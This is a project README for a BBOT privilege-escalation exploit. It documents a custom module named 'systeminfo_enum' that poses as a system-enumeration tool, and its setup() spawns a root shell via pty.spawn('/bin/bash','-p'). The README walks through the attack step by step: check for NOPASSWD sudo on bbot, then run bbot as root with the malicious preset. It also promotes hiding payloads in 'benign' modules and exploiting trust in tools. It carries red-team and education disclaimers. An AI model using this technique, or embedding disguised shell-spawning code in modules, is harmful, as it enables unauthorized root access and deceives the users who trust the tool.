# 🧨 BBOT Privilege Escalation Module: `systeminfo_enum`

This project demonstrates how a seemingly harmless module for **BBOT (Bighuge BLS OSINT Tool)** can be used to **gain root shell access** when BBOT is executed with elevated privileges. BBOT is a powerful open-source reconnaissance and attack surface mapping framework developed by [Black Lantern Security](https://github.com/blacklanternsecurity/bbot).

> ⚠️ For educational, red team, or CTF use **only**. Do **not** use on systems you don't have explicit permission to test.

---

## 🧬 Overview

`systeminfo_enum` is a custom BBOT module that:
- **Appears** to enumerate system information
- **Actually** spawns a `bash -p` root shell via `setup()` when BBOT starts the scan

---

## 🗂️ File Structure

```bash
.
├── systeminfo_enum.py       # The module itself (payload lives here)
└── preset.yml               # BBOT preset that loads this module
```

---

## ⚙️ Usage

### 🔧 1. Clone the Repo

```bash
git clone https://github.com/Housma/bbot-privesc.git
cd bbot-privesc
```

### 🔐 2. Check if You Have Sudo Access to BBOT Binary

Run the following to check your sudo permissions:

```bash
sudo -l
```

Example output:

```
Matching Defaults entries for kali on :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User kali may run the following commands on :
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

This means you can run BBOT as root without a password — which is **required** to trigger the privilege escalation.

### 🚀 3. Run BBOT with the Module

```bash
sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT
```

---

## 📁 About `module_dirs`

This project uses BBOT’s `module_dirs` feature to load the module locally:

```yaml
module_dirs:
  - .
```

This tells BBOT to look for the module in the **current working directory**. Just make sure you're inside this folder when running BBOT.

### ❗ Running from another location?

Update `preset.yml`:

```yaml
module_dirs:
  - /full/path/to/this/folder
```

---

## 💥 What Happens

As soon as BBOT runs, `systeminfo_enum` is loaded, and:

- `setup()` executes automatically
- It spawns a root shell via `pty.spawn(["/bin/bash", "-p"])`
- You are dropped into a **fully privileged shell session**

---

## 🧠 Red Team Use Cases

- Local privilege escalation via trusted recon tools
- Payload embedding in “benign” BBOT modules
- Social engineering + tool trust exploitation
- Living-off-the-land (LOTL) attacks

---

## ⚠️ Disclaimer

This project is intended for **ethical hacking**, **education**, and **authorized security assessments** only.  
The author is not responsible for any misuse of this code.

---
